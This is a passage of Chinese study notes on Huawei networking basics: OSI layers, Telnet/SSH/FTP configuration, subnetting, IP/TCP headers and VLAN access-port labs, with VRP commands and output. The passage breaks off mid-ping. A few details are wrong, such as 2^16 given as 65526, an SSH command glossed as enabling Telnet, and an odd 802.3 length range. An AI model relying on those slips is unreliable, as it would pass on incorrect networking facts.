style="text-align:center">TCP和UDP，形成会话和表示应用</td></tr><tr><td style="text-align:center">网络层</td><td style="text-align:center">packet（包）</td><td style="text-align:center">路由（route）或者结构化编址（IP协议）</td></tr><tr><td style="text-align:center">数据链路层</td><td style="text-align:center">Frame（帧）</td><td style="text-align:center">ppp、以太（ethernet）</td></tr><tr><td style="text-align:center">物理层</td><td style="text-align:center">bit（比特位）</td><td style="text-align:center">电气化信号/物理规律等内容，HUB、线缆</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>TCP/IP工业模型</th><th>描述</th></tr></thead><tbody><tr><td>网络接口层</td><td>对应物理层/数据链路层</td></tr><tr><td>互联网层</td><td>对应网路层</td></tr><tr><td>传输层</td><td>对应传输层</td></tr><tr><td>应用层</td><td>对应会话层/表示层/应用层</td></tr></tbody></table></div><hr><h1 id="设备的管理概述"><a href="#设备的管理概述" class="headerlink" title="设备的管理概述"></a><strong>设备的管理概述</strong></h1><p>一个设备的几个层面：控制层面（协议）、数据转发层面（传送报文）、管理层面<br>常见的管理方式：<br>A：面对面管理：Console（primary interface）<br>B：远程管理：Telnet/SSH（既有业务流量也有管理流量，带内管理）<br>C：专有的管理接口/网络：mgmt（带外管理）<br>D：Web管理方式（非专业人士的方式）</p><p><strong>console密码设置：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[AR1]user-interface console 0//进入console接口</span><br><span class="line">[AR1-ui-console0]authentication-mod password //设置密码认证</span><br><span class="line">Please configure the login password (maximum length 16):qytang//设置密码</span><br><span class="line">&lt;AR1&gt;quit</span><br><span class="line">Configuration console exit, please press any key to log on</span><br><span class="line">Login authentication</span><br><span class="line">Password://输入密码登录</span><br><span class="line">[AR1-ui-console0]undo authentication-mode//拿掉认证模式就可以取消密码设置</span><br></pre></td></tr></table></figure><hr><h1 id="数据封装-解封装"><a href="#数据封装-解封装" class="headerlink" title="数据封装/解封装"></a><strong>数据封装/解封装</strong></h1><p>抓包（wireshark）</p><p>DATA（在吗？）<br>程序的头部（QQ）|  DATA（在吗？）<br>UDP头部  |  程序的头部（QQ）|  DATA（在吗？）<br>IP头部  |  UDP头部  |  程序的头部（QQ）|  DATA（在吗？）<br>以太的头部  |  IP头部  |  UDP头部  |  程序的头部（QQ）|  DATA（在吗？）</p><hr><h1 id="MAC地址表"><a href="#MAC地址表" class="headerlink" title="MAC地址表"></a><strong>MAC地址表</strong></h1><p>交换机上一种转发决策表    |    路由器上大部分是没有，除非增加了以太模块</p><p>原则：一个MAC在同一时刻只能从一个接口学习到！</p><p>MAC得到的是帧中的源MAC</p><p>一个接口在同一时刻可以学习到多个终端的MAC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[SW3]dis mac-address</span><br><span class="line"></span><br><span class="line">MAC address table of slot 0:</span><br><span class="line"></span><br><span class="line">MAC Address    VLAN/       PEVLAN CEVLAN Port            Type      LSP/LSR-ID  </span><br><span class="line"></span><br><span class="line">               VSI/SI                                              MAC-Tunnel  </span><br><span class="line"></span><br><span class="line">00e0-fc45-3af2 1           -      -      GE0/0/3         dynamic   0/-         </span><br><span class="line"></span><br><span class="line">5489-98a2-4636 1           -      -      GE0/0/10        dynamic   0/-         </span><br><span class="line"></span><br><span class="line">Total matching items on slot 0 displayed = 2</span><br></pre></td></tr></table></figure><p>注意区分MAC地址表、ARP地址表、路由表</p><hr><h1 id="IP基础（3层）"><a href="#IP基础（3层）" class="headerlink" title="IP基础（3层）"></a><strong>IP基础（3层）</strong></h1><p>32位（二进制）<br>网络部分<br>主机部分<br>MASK（掩码）：0和1组成，1代码网络部分，0代表主机部分。0和1是连续的<br>255—-&gt;11111111</p><p>A类：0.0.0.0~127.255.255.255    /8<br>B类：128.0.0.0~191.255.255.255    /16<br>C类：192.0.0.0~223.255.255.255    /24</p><p>私有地址范围<br>10.0.0.0~10.255.255.255<br>172.16.0.0~172.31.255.255<br>192.168.0.0~192.168.255.255</p><p>特殊地址：<br>127.0.0.0~127.255.255.255    Loopback环回地址，测试<br>255.255.255.255~全局广播地址<br>在一个网络中，有两个地址不可以分配主机设备使用<br>10.1.10.255/24——&gt;定向广播地址——&gt;主机位全部为1（255-1111，1111）<br>10.1.10.0/24——&gt;网络地址——&gt;主机位全部为0（0-0000，0000）</p><hr><h1 id="Telnet管理方式"><a href="#Telnet管理方式" class="headerlink" title="Telnet管理方式"></a><strong>Telnet管理方式</strong></h1><p> 步骤一：配置地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1-Vlanif1]dis th</span><br><span class="line">interface Vlanif1 </span><br><span class="line">ip address 10.1.11.2 255.255.255.248</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;dis cu int g0/0/1</span><br><span class="line">interface GigabitEthernet0/0/1</span><br><span class="line"> ip address 10.1.11.1 255.255.255.248 </span><br></pre></td></tr></table></figure><p>步骤二：实施telnet服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW1]telnet server enable ---&gt;使能设备telnet服务</span><br><span class="line">Info: The Telnet server has been enabled.</span><br><span class="line"></span><br><span class="line">[SW1]user-interface vty 0 4---&gt;进入VTY的0到4通道</span><br><span class="line"></span><br><span class="line">[SW1-ui-vty0-4]set authentication password simple chen---&gt;设置远程通道简单密码认证</span><br></pre></td></tr></table></figure><p>步骤三：验证telnet测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;telnet 10.1.11.2//输入telnet地址</span><br><span class="line">  Press CTRL_] to quit telnet mode</span><br><span class="line">  Trying 10.1.11.2 ...</span><br><span class="line">  Connected to 10.1.11.2 ...</span><br><span class="line"></span><br><span class="line">Login authentication</span><br><span class="line"></span><br><span class="line">Password:            //输入密码</span><br><span class="line">Info: The max number of VTY users is 5, and the number</span><br><span class="line">      of current VTY users on line is 1.</span><br><span class="line">      The current login time is 2021-09-07 11:15:17.</span><br><span class="line">      </span><br><span class="line">&lt;SW1&gt;//显示SW1，成功进入SW1设备</span><br></pre></td></tr></table></figure><p>验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW1]display users</span><br><span class="line">  User-Intf    Delay    Type   Network Address     AuthenStatus    AuthorcmdFlag</span><br><span class="line"></span><br><span class="line">+ 0   CON 0   00:00:00                                                  no         Username : Unspecified</span><br><span class="line"></span><br><span class="line">  34  VTY 0   00:00:24   TEL    10.1.11.1                 pass          no         Username : Unspecified</span><br></pre></td></tr></table></figure><hr><h1 id="以太帧"><a href="#以太帧" class="headerlink" title="以太帧"></a><strong>以太帧</strong></h1><p>两种帧的封装：<br>以太2（用户业务流）：DMAC（目的）+SMAC（源）+type+Ddata（数据）+FCS<br>              6B        6B           2B     46~1500B         4B<br>type类型（2B字节）——-&gt;0800代表IP/0806代表ARP（地址解析协议）<br>1500字节—-MTU(最大传输单元)</p><p>802.3（协议控制帧）：DMAC+SMAC+Length+LLC+SNAP+Data+FCS<br>             6B           6B        2B        3B     5B      38~1942B    4B</p><p>IEEE802.3帧长度字段值小于等于1500（0×05DC）<br>EEthernet_II帧长度字段大于等于1536（0×0600）</p><p>MAC地址（48位6字节）由两部分组成<br>前24位代表供应商代码，由IEEE管理和分配<br>后24位代表序列号，由厂商自己分配</p><hr><p>单播：1对1，第八位=0<br>00=00000000</p><p>组播：1对N，第八位=1——-用于协议（STP、中间系统到中间系统等）<br>01=00000001</p><p>广播：1对All，所有全为1<br>全f（16进制）即全1（2进制）</p><hr><h1 id="IP子网"><a href="#IP子网" class="headerlink" title="IP子网"></a><strong>IP子网</strong></h1><p>2个特殊地址：<br>网络（网段）：主机部分全为0<br>定向广播地址：主机部分全为1<br>通过掩码区分主机部分和网络部分 </p><p>A类/8    B类/16    C类/24    D类/没有掩码</p><p>B类地址——172.16.0.0/16<br>主机位有16位（32-16），可以容纳的主机数目=2∧16=65526台终端</p><hr><p> <strong>128   64   32   16   8   4   2   1</strong></p><hr><p>10.4.10.20/25——&gt;10.4.10.20 255.255.255.128</p><p>20——-&gt;00010100</p><p>25——-&gt;00011001</p><p>第一个有效的IP是多少？10.4.10.1</p><p>网络地址是多少？ 10.4.10.0/25</p><p>广播地址是多少？10.4.10.127</p><p>最后一个可用地址是多少？ 10.4.10.126</p><p>下一个网络地址是多少？ 10.4.10.128/25</p><hr><p>195.26.78.46/29——&gt;195.26.78.46 255.255.255.248</p><p>46——-&gt;00101110</p><p>29——-&gt;11111000</p><p>网络地址是多少？ 00101000—195.26.78.40</p><p>广播地址是多少？ 00101111—195.26.78.47</p><hr><p>1.2.3.137/20——&gt;1.2.3.137  255.255.240.0</p><p>03——-&gt;0000{0011，10001001}</p><p>20——-&gt;1111{0000，00000000}—&gt;主机位</p><p>网络地址：1.2.0.0————-&gt;主机位全为0—&gt;00000000，00000000</p><p>广播地址：1.2.15.255——-&gt;主机位全为1—&gt;00001111，11111111</p><p>主机路由  /32的路由（所有主机位全部占满）</p><p>基本配置在逻辑接口（子接口、环回接口、隧道接口、拨号接口）</p><hr><h1 id="IP头部"><a href="#IP头部" class="headerlink" title="IP头部"></a><strong>IP头部</strong></h1><p>MTU—&gt;1500—&gt;最大传输单元</p><p>IP头+IPData≤1500</p><p>IP头+IPData&gt;1500——&gt;要实施IP分片—&gt;只有IP才可以分片</p><hr><p>例：<br>ping -s 1500 192.168.1.1——&gt;会被分片<br>-s指的是IP承载的数据大小（不包含IP头部）<br>ping -s 1472 192.168.1.1——&gt;没有分片<br>1472的数据+ICMP的头部（8）+IP头部（20），刚好等于1500  </p><hr><div class="table-container"><table><thead><tr><th style="text-align:center">内容</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">Version</td><td style="text-align:center">4/6 版本号</td></tr><tr><td style="text-align:center">DS Field</td><td style="text-align:center">差分服务字段（Qos）</td></tr><tr><td style="text-align:center">Total Length</td><td style="text-align:center">IP包的总长度</td></tr><tr><td style="text-align:center">Identification</td><td style="text-align:center">用于表明是同一个报文的分片</td></tr><tr><td style="text-align:center">Flags</td><td style="text-align:center">标记位&gt;更多分片/不允许分片 ping -f</td></tr><tr><td style="text-align:center">Fragment Offset</td><td style="text-align:center">分片偏移位&gt;1480偏移</td></tr><tr><td style="text-align:center">Time to live</td><td style="text-align:center">生存时间，IP报文头部中的防环功能字段，8位，最大值255，取值=0丢弃报文</td></tr><tr><td style="text-align:center">protocol</td><td style="text-align:center">协议  ICMP(1)、 TCP(6)、UDP(17)</td></tr><tr><td style="text-align:center">Source IP</td><td style="text-align:center">源IP</td></tr><tr><td style="text-align:center">Destination</td><td style="text-align:center">目的IP</td></tr><tr><td style="text-align:center">IP Options</td><td style="text-align:center">IP可选字段 20字节扩展为60字节</td></tr></tbody></table></div><blockquote><p><strong>注：只有IP头部才有fragment</strong></p></blockquote><hr><h1 id="ICMP消息类型和编码类型"><a href="#ICMP消息类型和编码类型" class="headerlink" title="ICMP消息类型和编码类型"></a><strong>ICMP消息类型和编码类型</strong></h1><div class="table-container"><table><thead><tr><th style="text-align:center">Type</th><th style="text-align:center">Code</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">Echo Reply</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">0</td><td style="text-align:center">网络不可达</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">1</td><td style="text-align:center">主机不可达</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">2</td><td style="text-align:center">协议不可达</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">3</td><td style="text-align:center">端口不可达</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">0</td><td style="text-align:center">重定向</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">0</td><td style="text-align:center">Echo Request</td></tr></tbody></table></div><hr><h1 id="ARP-地址解析协议"><a href="#ARP-地址解析协议" class="headerlink" title="ARP/地址解析协议"></a><strong>ARP/地址解析协议</strong></h1><p>介于2层和3层之间</p><p>以太网中完成2层封装—-&gt;目的IP对应的MAC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]dis arp</span><br></pre></td></tr></table></figure><p>ARP表，可以存在终端PC、路由器上、交换机上（存在IP）</p><p>点到点链路（ppp）没有MAC，也没有ARP</p><p>免费ARP用于检测IP地址冲突</p><p>ARP广播方式得到目标地址对应的MAC</p><p>ARP报文不能穿越路由器，不能被转发到其他广播域</p><p>ARP协议的作用是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行，将计算机的网络地址【IP地址32位】转化为物理地址【MAC地址48位】。</p><hr><h1 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a><strong>传输层协议</strong></h1><p>常见的两个协议：传输控制协议（TCP）、用户数据包协议（UDP）<br>帧—-&gt;类型<br>IP—-&gt;协议<br>TCP-&gt;端口<br>    FTP——-&gt;21、20<br>    HTTP—-&gt;80<br>    https—-&gt;443<br>    Telnet—&gt;23<br>    SSH——-&gt;22<br>    SMTP—-&gt;25<br>    DNS—-&gt;53</p><h2 id="步骤一，创建用户和密码"><a href="#步骤一，创建用户和密码" class="headerlink" title="步骤一，创建用户和密码"></a><strong>步骤一，创建用户和密码</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaa</span><br><span class="line">local-user chen password cipher chen privilege level 15//创建本地用户chen，登陆最高级别15</span><br><span class="line">local-user chen service-type ssh//用户chen通过ssh登录</span><br></pre></td></tr></table></figure><h2 id="步骤二，开启SSH"><a href="#步骤二，开启SSH" class="headerlink" title="步骤二，开启SSH"></a><strong>步骤二，开启SSH</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh user chen authentication-type password//ssh用户chen通过密码进行认证</span><br><span class="line">stelnet server enable//开启telnet服务</span><br></pre></td></tr></table></figure><h2 id="步骤三，在VTY下应用"><a href="#步骤三，在VTY下应用" class="headerlink" title="步骤三，在VTY下应用"></a><strong>步骤三，在VTY下应用</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user-interface vty 0 4</span><br><span class="line">protocol inbound ssh</span><br><span class="line">authentication-mode aaa</span><br><span class="line">ssh client first-time enable</span><br></pre></td></tr></table></figure><h2 id="步骤四，测试"><a href="#步骤四，测试" class="headerlink" title="步骤四，测试"></a><strong>步骤四，测试</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]dis users</span><br><span class="line">  User-Intf    Delay    Type   Network Address     AuthenStatus    AuthorcmdFlag</span><br><span class="line"></span><br><span class="line">+ 130 VTY 1   00:00:00  SSH    10.1.1.2                  pass                   </span><br><span class="line">  Username : chen </span><br></pre></td></tr></table></figure><hr><h1 id="TCP头部-20字节大小"><a href="#TCP头部-20字节大小" class="headerlink" title="TCP头部/20字节大小"></a><strong>TCP头部/20字节大小</strong></h1><div class="table-container"><table><thead><tr><th style="text-align:center">内容</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">Source Port</td><td style="text-align:center">源端口</td></tr><tr><td style="text-align:center">Destination Port</td><td style="text-align:center">目的端口</td></tr><tr><td style="text-align:center">Sequence Number</td><td style="text-align:center">序列号</td></tr><tr><td style="text-align:center">Acknowledge Number</td><td style="text-align:center">确认号</td></tr><tr><td style="text-align:center">Header length</td><td style="text-align:center">头部长度&gt;20</td></tr><tr><td style="text-align:center">URG</td><td style="text-align:center">紧急报文</td></tr><tr><td style="text-align:center">ACK</td><td style="text-align:center">为1（置位）为0（没有）</td></tr><tr><td style="text-align:center">PSH</td><td style="text-align:center">把数据推送给应用客户端</td></tr><tr><td style="text-align:center">RST</td><td style="text-align:center">重置</td></tr><tr><td style="text-align:center">SYN</td><td style="text-align:center">请求建立连接//3次握手，3个报文的交互，正常情况下只有SYN这个报文</td></tr><tr><td style="text-align:center">FIN</td><td style="text-align:center">结束会话</td></tr><tr><td style="text-align:center">Window</td><td style="text-align:center">窗口大小</td></tr></tbody></table></div><p><strong>3次握手:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYN：（MSS1460=1500-IP头部20-TCP头部20=1460）</span><br><span class="line">SYN，ACK</span><br><span class="line">ACK</span><br></pre></td></tr></table></figure><p><strong>4次断开:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FIN，ACK</span><br><span class="line">ACK，</span><br><span class="line">FIN，ACLK</span><br><span class="line">ACK</span><br></pre></td></tr></table></figure><hr><h1 id="FTP基础"><a href="#FTP基础" class="headerlink" title="FTP基础"></a><strong>FTP基础</strong></h1><p>FTP（文件传输协议）应用在华为ARP的升级实现—-&gt;20/21端口</p><p>TFTP（简单文件传输协议）应用在思科IOS—&gt;69端口</p><p>数据流（会话，五元组）：源IP    、目的IP、源端口、目的端口、协议</p><p>FTP采用两个TCP连接：控制连接（连接控制端口，传输控制命令）</p><p>​                                        数据连接（连接数据端口，传输数据）</p><p><strong>配置R1作为服务器端的实施</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R1]ftp server enable ---&gt;开启ftp服务</span><br><span class="line">[R1]aaa ---&gt;进入aaa视图</span><br><span class="line">[R1-aaa]local-user chen password cipher chen ---&gt;创建用户chen密码chen</span><br><span class="line">[R1-aaa]local-user chen privilege level 15   ---&gt;chen用户为管理级15级</span><br><span class="line">[R1-aaa]local-user chen ftp-directory flash: ---&gt;该用户访问的ftp目录为根目录</span><br><span class="line">[R1-aaa]local-user chen service-type ssh ftp ---&gt;该用户可以用ssh和ftp</span><br></pre></td></tr></table></figure><p><strong>测试，</strong></p><p><strong>步骤一，在R1上创建一个压缩文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;R1&gt;save chen.zip</span><br><span class="line">&lt;R1&gt;dir</span><br><span class="line">Directory of flash:/</span><br><span class="line">  Idx  Attr     Size(Byte)  Date              Time(LMT)     FileName </span><br><span class="line">    0  drw-        -       Sep 22 2021      10:51:00            dhcp</span><br><span class="line">    1  -rw-     121,802    May 26 2014      09:20:58         portalpage.zip</span><br><span class="line">    2  -rw-     2,263      Sep 22 2021      10:50:55         statemach.efs</span><br><span class="line">    3  -rw-     828,482    May 26 2014      09:20:58        sslvpn.zip</span><br><span class="line">    4  -rw-       289      Sep 22 2021      11:08:22       private-data.txt</span><br><span class="line">    5  -rw-       707      Sep 22 2021      11:08:45       chen.zip</span><br><span class="line">    6  -rw-       711      Sep 22 2021      11:08:22        vrpcfg.zip</span><br></pre></td></tr></table></figure><p><strong>步骤二，在R2登录R1 ftp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;R2&gt;ftp 10.1.1.1</span><br><span class="line">Trying 10.1.1.1 ...</span><br><span class="line"></span><br><span class="line">Press CTRL+K to abort</span><br><span class="line">Connected to 10.1.1.1.</span><br><span class="line">220 FTP service ready.</span><br><span class="line">User(10.1.1.1:(none)):chen</span><br><span class="line">331 Password required for chen.</span><br><span class="line">Enter password:</span><br><span class="line">230 User logged in.</span><br><span class="line"></span><br><span class="line">[R2-ftp]dir</span><br><span class="line">200 Port command okay.</span><br><span class="line">150 Opening ASCII mode data connection for *.</span><br><span class="line">drwxrwxrwx   1 noone    nogroup         0 Sep 22 10:51 dhcp</span><br><span class="line">-rwxrwxrwx   1 noone    nogroup    121802 May 26  2014 portalpage.zip</span><br><span class="line">-rwxrwxrwx   1 noone    nogroup      2263 Sep 22 10:50 statemach.efs</span><br><span class="line">-rwxrwxrwx   1 noone    nogroup    828482 May 26  2014 sslvpn.zip</span><br><span class="line">-rwxrwxrwx   1 noone    nogroup       289 Sep 22 11:08 private-data.txt</span><br><span class="line">-rwxrwxrwx   1 noone    nogroup       707 Sep 22 11:08 chen.zip----------&gt;查看到文件</span><br><span class="line">drwxrwxrwx   1 noone    nogroup         0 Sep 22 11:08 .</span><br><span class="line">-rwxrwxrwx   1 noone    nogroup       711 Sep 22 11:08 vrpcfg.zip</span><br></pre></td></tr></table></figure><p><strong>步骤三，下载文件到R2</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R2-ftp]get chen.zip</span><br><span class="line">200 Port command okay.</span><br><span class="line">150 Opening ASCII mode data connection for chen.zip.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">FTP: 707 byte(s) received in 0.180 second(s) 3.92Kbyte(s)/sec.</span><br></pre></td></tr></table></figure><hr><h1 id="交换基础"><a href="#交换基础" class="headerlink" title="交换基础"></a><strong>交换基础</strong></h1><p>VLAN（Virtual Local Area Network）：虚拟局域网，将一个物理的局域网在逻辑上划分多个广播域的技术，在同一个VLAN内的用户可以进行二层互访，不同VLAN用户被二层隔离.</p><p>交换机的每个接口都是一个冲突域</p><p>VLAN的本质是什么？<br>答：默认所有的端口在一个广播域，为了更好的隔离2层，实现2层、3层通信，隔离多个广播域。</p><p>Broad cast / No MAC-address——&gt;学习</p><p><em>交换机的转发行为：</em><br>泛洪(Flooding)：将数据发送到所有接口<br>转发(Forwarding)：转发到已有的接口<br>丢弃(Discarding) </p><ul><li>数据帧的D.MAC地址不在MAC表中或者D.MAC地址为广播地址时，交换机会泛洪帧。</li></ul><hr><h2 id="VLAN隔离广播域"><a href="#VLAN隔离广播域" class="headerlink" title="VLAN隔离广播域"></a><strong>VLAN隔离广播域</strong></h2><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW3]vlan 10</span><br><span class="line">[SW3]int g0/0/11</span><br><span class="line">[SW3-GigabitEthernet0/0/11]port link-type access //修改模式为接入</span><br><span class="line">[SW3-GigabitEthernet0/0/11]port default vlan 10//属于vlan10</span><br></pre></td></tr></table></figure><hr><p>交换机内部通过TAG识别不同VLAN的帧</p><p>VLAN的数目：2^12^次方，1~4094——&gt;VXLAN（虚拟扩展局域网，）</p><p>PVID（port valn id）：端口vlan id，帧进入交换机是被增加的标记—-&gt;接入模式端口有关</p><p>入：增加PVID<br>出：拿掉Tag</p><ul><li><p>HW交换机有4种类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW3-GigabitEthernet0/0/11]port link-type ?</span><br><span class="line">  access        Access port//接入</span><br><span class="line">  dot1q-tunnel  QinQ port//多层干道</span><br><span class="line">  hybrid        Hybrid port//混杂</span><br><span class="line">  trunk         Trunk port//干道</span><br></pre></td></tr></table></figure></li></ul><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vlan batch 8 9 10 //批量创建VLAN</span><br><span class="line">display port vlan active//查看当前端口vlan状态</span><br></pre></td></tr></table></figure><h2 id="Access（接入-独享）"><a href="#Access（接入-独享）" class="headerlink" title="Access（接入/独享）"></a><strong>Access（接入/独享）</strong></h2><p>工作原理：以太帧出入（交换机）方向都是唯一的一个VLAN ID</p><ul><li>注：Vlan List：端口允许那些VLAN以及是什么方式（拿掉标记tag）通过端口</li></ul><p>==接入模式（access）可以用于不同交换机之间==</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a><strong>实验二</strong></h3><p><strong>接入模式用于不同交换机之间，建立PC1和R1的通信（沿途链路都为VLAN10）</strong></p><div class="table-container"><table><thead><tr><th>导图：                                    [R1]                             <br />                                  G0/1                      G0/2            <br />                                [SW1]      G0/5       [SW2]           <br />                                [SW1]      G0/6       [SW2]           <br />                                 G0/3                        G0/1            <br />                                                [SW3]</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PC：10.1.10.1/28</span><br><span class="line"></span><br><span class="line">[R1]int g0/0/1</span><br><span class="line">[R1-GigabitEthernet0/0/1]ip adress 10.1.10.10 28</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW1]int g0/0/1</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port link-type access </span><br><span class="line">[SW1-GigabitEthernet0/0/1]port default vlan 10</span><br><span class="line">[SW1]int g0/0/3</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type access </span><br><span class="line">[SW1-GigabitEthernet0/0/3]port default vlan 10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW3]int g0/0/1</span><br><span class="line">[SW3-GigabitEthernet0/0/3] port link-type access</span><br><span class="line">[SW3-GigabitEthernet0/0/3] port default vlan 10</span><br><span class="line">[SW3]int g0/0/10</span><br><span class="line">[SW3-GigabitEthernet0/0/10] port link-type access</span><br><span class="line">[SW3-GigabitEthernet0/0/10] port default vlan 10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">【测试】</span><br><span class="line">&lt;R1&gt;ping 10.1.10.1</span><br><span class="line">  PING 10.1.10.1: 56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=1 ttl=128 time=260 ms</span><br><span class="line">    Reply from 10.1.10.1: bytes=56 Sequence=2 